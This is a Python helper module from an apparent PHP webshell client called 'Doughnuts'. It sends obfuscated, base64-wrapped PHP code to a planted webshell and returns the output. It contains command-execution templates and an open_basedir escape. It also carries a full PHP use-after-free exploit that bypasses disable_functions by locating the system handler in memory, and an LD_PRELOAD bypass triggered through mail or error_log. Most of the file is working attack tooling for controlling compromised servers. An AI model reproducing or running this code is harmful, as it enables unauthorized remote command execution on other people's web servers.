import json
import subprocess
from base64 import b64decode, b64encode
from platform import system
from random import randint, sample
from uuid import uuid4

import requests
from urllib3 import disable_warnings

from libs.config import color, gset, gget

level = []
connect_pipe_map = {True: "│  ", False: "   "}
SYSTEM_TEMPLATE = None

disable_warnings()


def banner():
    logo_choose = randint(1, 3)
    if logo_choose == 1:
        print(
            r"""
  _____                    _                 _
 |  __ \                  | |               | |
 | |  | | ___  _   _  __ _| |__  _ __  _   _| |_ ___
 | |  | |/ _ \| | | |/ _` | '_ \| '_ \| | | | __/ __|
 | |__| | (_) | |_| | (_| | | | | | | | |_| | |_\__ \
 |_____/ \___/ \__,_|\__, |_| |_|_| |_|\__,_|\__|___/
                      __/ |
                     |___/

 """
        )
    if logo_choose == 2:
        print(
            r"""
    ____                    __                __
   / __ \____  __  ______ _/ /_  ____  __  __/ /______
  / / / / __ \/ / / / __ `/ __ \/ __ \/ / / / __/ ___/
 / /_/ / /_/ / /_/ / /_/ / / / / / / / /_/ / /_(__  )
/_____/\____/\__,_/\__, /_/ /_/_/ /_/\__,_/\__/____/
                  /____/

"""
        )
    if logo_choose == 3:
        print(
            r"""
'########:::'#######::'##::::'##::'######:::'##::::'##:'##::: ##:'##::::'##:'########::'######::
 ##.... ##:'##.... ##: ##:::: ##:'##... ##:: ##:::: ##: ###:: ##: ##:::: ##:... ##..::'##... ##:
 ##:::: ##: ##:::: ##: ##:::: ##: ##:::..::: ##:::: ##: ####: ##: ##:::: ##:::: ##:::: ##:::..::
 ##:::: ##: ##:::: ##: ##:::: ##: ##::'####: #########: ## ## ##: ##:::: ##:::: ##::::. ######::
 ##:::: ##: ##:::: ##: ##:::: ##: ##::: ##:: ##.... ##: ##. ####: ##:::: ##:::: ##:::::..... ##:
 ##:::: ##: ##:::: ##: ##:::: ##: ##::: ##:: ##:::: ##: ##:. ###: ##:::: ##:::: ##::::'##::: ##:
 ########::. #######::. #######::. ######::: ##:::: ##: ##::. ##:. #######::::: ##::::. ######::
........::::.......::::.......::::......::::..:::::..::..::::..:::.......::::::..::::::......:::

"""
        )
    print(color.green("Doughnut Version: 2.7\n"))


def base64_encode(data: str):
    return b64encode(data.encode()).decode()


def base64_decode(data: str):
    return b64decode(data.encode()).decode()


def send(data: str, raw: bool = False, **extra_params):
    offset = 8

    def randstr(offset):
        return ''.join(sample("!@#$%^&*()[];,.?", offset))
    url = gget("url", "webshell")
    params_dict = gget("webshell.params_dict", "webshell")
    php_v7 = gget("webshell.v7", "webshell")
    password = gget("webshell.password", "webshell")
    raw_key = gget("webshell.method", "webshell")
    encode_functions = gget("webshell.encode_functions", "webshell")
    encode_pf = gget("encode.pf")
    params_dict.update(extra_params)
    if "data" not in params_dict:
        params_dict["data"] = {}
    head = randstr(offset)
    tail = randstr(offset)
    pwd_b64 = b64encode(
        gget("webshell.pwd", "webshell", "Lg==").encode()).decode()
    if not raw:
        data = f"""error_reporting(0);chdir(base64_decode("{pwd_b64}"));print("{head}");""" + data
        if (gget("webshell.bypass_obd", "webshell")):
            data = """$dir=pos(glob("./*", GLOB_ONLYDIR));
$cwd=getcwd();
$ndir="./%s";
if($dir === false){
$r=mkdir($ndir);
if($r === true){$dir=$ndir;}}
chdir($dir);
ini_set("open_basedir","..");
$c=substr_count(getcwd(), "/");
for($i=0;$i<$c;$i++) chdir("..");
ini_set("open_basedir", "/");
chdir($cwd);rmdir($ndir);""" % (uuid4()) + data
        data += f"""print("{tail}");"""
        data = f"""eval(base64_decode("{base64_encode(data)}"));"""
        # data = f"""eval('error_reporting(0);chdir(base64_decode("{pwd_b64}"));print(\\'{head}\\');eval(base64_decode("{base64_encode(data)}"));print(\\'{tail}\\');');"""
        if (not php_v7):
            data = f"""assert(base64_decode("{base64_encode(data)}"));"""
    for func in encode_functions:
        if func in encode_pf:
            data = encode_pf[func].run(data)
    params_dict[raw_key][password] = data
    try:
        req = requests.post(url, verify=False, **params_dict)
    except requests.RequestException:
        print(color.red("\nRequest Error\n"))
        return
    if (req.apparent_encoding):
        req.encoding = encoding = req.apparent_encoding
    else:
        encoding = "utf-8"
    text = req.text
    content = req.content
    text_head_offset = text.find(head)
    text_tail_offset = text.find(tail)
    text_head_offset = text_head_offset + \
        offset if (text_head_offset != -1) else 0
    text_tail_offset = text_tail_offset if (
        text_tail_offset != -1) else len(text)
    con_head_offset = content.find(head.encode(encoding))
    con_tail_offset = content.find(tail.encode(encoding))
    con_head_offset = con_head_offset + \
        offset if (con_head_offset != -1) else 0
    con_tail_offset = con_tail_offset if (
        con_tail_offset != -1) else len(content)
    req.r_text = text[text_head_offset: text_tail_offset]
    req.r_content = content[con_head_offset: con_tail_offset]
    try:
        req.r_json = json.loads(req.r_text)
    except json.JSONDecodeError:
        req.r_json = ''
    if 0:  # DEBUG
        print(f"[debug] {params_dict}")
        print(f"[debug] {url}")
        print(f"[debug] [{req}] [len:{len(content)}] {text}")
    return req


def delay_send(time: float, data: str, raw: bool = False, **extra_params):
    from time import sleep
    sleep(time)
    send(data, raw, **extra_params)


def print_webshell_info():
    info = (
        gget("webshell.root", "webshell"),
        gget("webshell.os_version", "webshell"),
        gget("webshell.php_version", "webshell"),
        gget("webshell.server_version", "webshell"),
        gget("webshell.obd", "webshell", "None")
    )
    info_name = ("Web root:", "OS version:", "PHP version:",
                 "Server version:", "Open_basedir:")
    for name, info in zip(info_name, info):
        print(name + "\n    " + info + "\n")


def prepare_system_template(exec_func: str):
    global SYSTEM_TEMPLATE
    if (not exec_func):
        SYSTEM_TEMPLATE = ''
    elif (exec_func == 'system'):
        SYSTEM_TEMPLATE = """ob_start();system(base64_decode("%s"));$o=ob_get_contents();ob_end_clean();"""
    elif (exec_func == 'exec'):
        SYSTEM_TEMPLATE = """$o=array();exec(base64_decode("%s"), $o);$o=join(chr(10),$o);"""
    elif (exec_func == 'passthru'):
        SYSTEM_TEMPLATE = """$o=array();passthru(base64_decode("%s"), $o);$o=join(chr(10),$o);"""
    elif (exec_func == 'proc_open'):
        SYSTEM_TEMPLATE = """$handle=proc_open(base64_decode("%s"),array(array('pipe','r'),array('pipe','w'),array('pipe','w')),$pipes);$o=NULL;while(!feof($pipes[1])){$o.=fread($pipes[1],1024);}@proc_close($handle);"""
    elif (exec_func == 'shell_exec'):
        SYSTEM_TEMPLATE = """$o=shell_exec(base64_decode("%s"));"""
    elif (exec_func == 'popen'):
        SYSTEM_TEMPLATE = """$fp=popen(base64_decode("%s"),'r');$o=NULL;if(is_resource($fp)){while(!feof($fp)){$o.=fread($fp,1024);}}@pclose($fp);"""
    elif (exec_func == 'pcntl_exec'):
        SYSTEM_TEMPLATE = """ob_start();pcntl_exec("/bin/bash", array("-c",base64_decode(""%s")));$o=ob_get_contents();ob_end_clean();"""


def get_system_code(command: str, print_result: bool = True):
    bypass_df = gget("webshell.bypass_df", "webshell")
    if (gget("webshell.exec_func", "webshell")):
        return SYSTEM_TEMPLATE % (base64_encode(command)) + ("print($o);" if print_result else "")
    elif (bypass_df == 1):
        return """pwn(base64_decode("%s"));
function pwn($cmd) {
    global $abc, $helper, $backtrace;

    class Vuln {
        public $a;
        public function __destruct() {
            global $backtrace;
            unset($this->a);
            $backtrace = (new Exception)->getTrace(); # ;)
            if(!isset($backtrace[1]['args'])) { # PHP >= 7.4
                $backtrace = debug_backtrace();
            }
        }
    }

    class Helper {
        public $a, $b, $c, $d;
    }

    function str2ptr(&$str, $p = 0, $s = 8) {
        $address = 0;
        for($j = $s-1; $j >= 0; $j--) {
            $address <<= 8;
            $address |= ord($str[$p+$j]);
        }
        return $address;
    }

    function ptr2str($ptr, $m = 8) {
        $out = "";
        for ($i=0; $i < $m; $i++) {
            $out .= chr($ptr & 0xff);
            $ptr >>= 8;
        }
        return $out;
    }

    function write(&$str, $p, $v, $n = 8) {
        $i = 0;
        for($i = 0; $i < $n; $i++) {
            $str[$p + $i] = chr($v & 0xff);
            $v >>= 8;
        }
    }

    function leak($addr, $p = 0, $s = 8) {
        global $abc, $helper;
        write($abc, 0x68, $addr + $p - 0x10);
        $leak = strlen($helper->a);
        if($s != 8) { $leak %%= 2 << ($s * 8) - 1; }
        return $leak;
    }

    function parse_elf($base) {
        $e_type = leak($base, 0x10, 2);

        $e_phoff = leak($base, 0x20);
        $e_phentsize = leak($base, 0x36, 2);
        $e_phnum = leak($base, 0x38, 2);

        for($i = 0; $i < $e_phnum; $i++) {
            $header = $base + $e_phoff + $i * $e_phentsize;
            $p_type  = leak($header, 0, 4);
            $p_flags = leak($header, 4, 4);
            $p_vaddr = leak($header, 0x10);
            $p_memsz = leak($header, 0x28);

            if($p_type == 1 && $p_flags == 6) { # PT_LOAD, PF_Read_Write
                # handle pie
                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;
                $data_size = $p_memsz;
            } else if($p_type == 1 && $p_flags == 5) { # PT_LOAD, PF_Read_exec
                $text_size = $p_memsz;
            }
        }

        if(!$data_addr || !$text_size || !$data_size)
            return false;

        return [$data_addr, $text_size, $data_size];
    }

    function get_basic_funcs($base, $elf) {
        list($data_addr, $text_size, $data_size) = $elf;
        for($i = 0; $i < $data_size / 8; $i++) {
            $leak = leak($data_addr, $i * 8);
            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                $deref = leak($leak);
                # 'constant' constant check
                if($deref != 0x746e6174736e6f63)
                    continue;
            } else continue;

            $leak = leak($data_addr, ($i + 4) * 8);
            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                $deref = leak($leak);
                # 'bin2hex' constant check
                if($deref != 0x786568326e6962)
                    continue;
            } else continue;

            return $data_addr + $i * 8;
        }
    }

    function get_binary_base($binary_leak) {
        $base = 0;
        $start = $binary_leak & 0xfffffffffffff000;
        for($i = 0; $i < 0x1000; $i++) {
            $addr = $start - 0x1000 * $i;
            $leak = leak($addr, 0, 7);
            if($leak == 0x10102464c457f) { # ELF header
                return $addr;
            }
        }
    }

    function get_system($basic_funcs) {
        $addr = $basic_funcs;
        do {
            $f_entry = leak($addr);
            $f_name = leak($f_entry, 0, 6);

            if($f_name == 0x6d6574737973) { # system
                return leak($addr + 8);
            }
            $addr += 0x20;
        } while($f_entry != 0);
        return false;
    }

    function trigger_uaf($arg) {
        # str_shuffle prevents opcache string interning
        $arg = str_shuffle(str_repeat('A', 79));
        $vuln = new Vuln();
        $vuln->a = $arg;
    }

    if(stristr(PHP_OS, 'WIN')) {
        die('This PoC is for *nix systems only.');
    }

    $n_alloc = 10; # increase this value if UAF fails
    $contiguous = [];
    for($i = 0; $i < $n_alloc; $i++)
        $contiguous[] = str_shuffle(str_repeat('A', 79));

    trigger_uaf('x');
    $abc = $backtrace[1]['args'][0];

    $helper = new Helper;
    $helper->b = function ($x) { };

    if(strlen($abc) == 79 || strlen($abc) == 0) {
        die("UAF failed");
    }

    # leaks
    $closure_handlers = str2ptr($abc, 0);
    $php_heap = str2ptr($abc, 0x58);
    $abc_addr = $php_heap - 0xc8;

    # fake value
    write($abc, 0x60, 2);
    write($abc, 0x70, 6);

    # fake reference
    write($abc, 0x10, $abc_addr + 0x60);
    write($abc, 0x18, 0xa);

    $closure_obj = str2ptr($abc, 0x20);

    $binary_leak = leak($closure_handlers, 8);
    if(!($base = get_binary_base($binary_leak))) {
        die("bdf error: Couldn't determine binary base address");
    }

    if(!($elf = parse_elf($base))) {
        die("bdf error: Couldn't parse ELF header");
    }

    if(!($basic_funcs = get_basic_funcs($base, $elf))) {
        die("bdf error: Couldn't get basic_functions address");
    }

    if(!($zif_system = get_system($basic_funcs))) {
        die("bdf error: Couldn't get zif_system address");
    }

    # fake closure object
    $fake_obj_offset = 0xd0;
    for($i = 0; $i < 0x110; $i += 8) {
        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));
    }

    write($abc, 0x20, $abc_addr + $fake_obj_offset);
    write($abc, 0xd0 + 0x38, 1, 4); # internal func type
    write($abc, 0xd0 + 0x68, $zif_system); # internal func handler
    ob_start();
    ($helper->b)($cmd);
    $o=ob_get_contents();
    ob_end_clean();
    %s
}""" % (base64_encode(command), ("print($o);" if print_result else ""))
    elif (bypass_df == 2):
        ld_preload_func = gget("webshell.ld_preload_func", "webshell")
        ld_preload_command = ""
        if (ld_preload_func == "mail"):
            ld_preload_command = "mail('','','','');"
        elif (ld_preload_func == "error_log"):
            ld_preload_command = "error_log('',1);"
        elif (ld_preload_func == "mb_send_mail"):
            ld_preload_command = "mb_send_mail('','','')"
        elif (ld_preload_func == "imap_mail"):
            ld_preload_command = 'imap_mail("1@a.com","0","1","2","3");'
        return """$p="/tmp/%s";
putenv(base64_decode("%s"));
putenv("rpath=$p");
putenv("LD_PRELOAD=%s");
%s
$o=file_get_contents($p);
unlink($p);
%s""" % (str(uuid4()),
         base64_encode(command),
         gget("webshell.ld_preload_path", "webshell"),
         ld_preload_command,
         ("print($o);" if print_result else ""))
    else:
        return """print("No system execute function!\\n")"""


def is_windows(remote: bool = True):
    if (remote):
        return gget("webshell.iswin", "webshell")
    else:
        if (not gget("iswin")):
            flag = True if 'win' in system().lower() else False
            gset("iswin", flag)
        else:
            flag = gget("iswin")
        return flag


def has_env(env: str, remote: bool = True):
    if (is_windows(remote)):
        command = "where"
    else:
        command = "which"
    if (remote):
        if (not gget("webshell.has_%s" % env, "webshell")):
            flag = send(get_system_code(f"{command} {env}")).r_text
            gset("webshell.has_%s" % env, flag, namespace="webshell")
        else:
            flag = gget("webshell.has_%s" % env, "webshell")
    else:
        if (not gget("has_%s")):
            p = subprocess.Popen(
                [command, env], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            flag = p.stdout.read()
            gset("has_%s" % env, flag)
        else:
            flag = gget("has_%s")
    return len(flag)


def open_editor(file_path: str):
    editor = "notepad.exe" if has_env("notepad.exe", False) else "vi"
    try:
        p = subprocess.Popen([editor, file_path], shell=False)
        p.wait()
        return True
    except FileNotFoundError:
        return False


def _print_tree(tree_or_node, depth=0, is_file=False, end=False):
    if (is_file):
        pipe = "└─" if (end) else "├─"
        connect_pipe = "".join([connect_pipe_map[_] for _ in level[:depth-1]])
        try:
            tree_or_node = b64decode(tree_or_node.encode()).decode('gbk')
        except Exception:
            pass
        if ("/" in tree_or_node):
            tree_or_node = tree_or_node.split("/")[-1]
        print(connect_pipe + pipe + tree_or_node)
    elif (isinstance(tree_or_node, list)):
        index = 0
        for v in tree_or_node:
            index += 1
            if (index == len(tree_or_node)):
                end = True
            _print_tree(v, depth+1, is_file=True, end=end)  # 输出目录
    elif (isinstance(tree_or_node, dict)):
        index = 0
        level.append(True)
        for k, v in tree_or_node.items():
            index += 1
            if (index == len(tree_or_node)):
                end = True
            if (isinstance(v, (list, dict))):  # 树中树
                _print_tree(k, depth+1, is_file=True, end=end)  # 输出目录
                if (end):
                    level[depth] = False
                _print_tree(v, depth+1)  # 递归输出树x
            elif (isinstance(v, str)) or v is None:  # 节点
                _print_tree(v, depth+1, is_file=True, end=end)  # 输出文件


def print_tree(name, tree):
    global level
    level = []
    print(name)
    _print_tree(tree)


def old_print_tree(origin_path: str, tree: dict, depth: int = 0):
    if depth:
        if not origin_path.isdigit() and tree:
            origin_path = color.blue(origin_path)
            if depth == 1:
                print("├──" + origin_path)
            else:
                print("│" + "  │" * (depth - 1) + "  " + "├─" + origin_path)
        else:
            depth -= 1

    else:
        print(origin_path)
    if isinstance(tree, dict):
        for k, v in tree.items():
            print_tree(k, v, depth + 1)
    if isinstance(tree, str):
        tree = [tree]
    if isinstance(tree, list):
        if not depth:
            new_tree = ["├─" + file.split("/")[-1] for file in tree]
            print("\n".join(new_tree))
        else:
            new_tree = [
                "│" + "  │" * (depth - 1) + "  " + "├─" + file.split("/")[-1]
                for file in tree
            ]
            print("\n".join(new_tree))
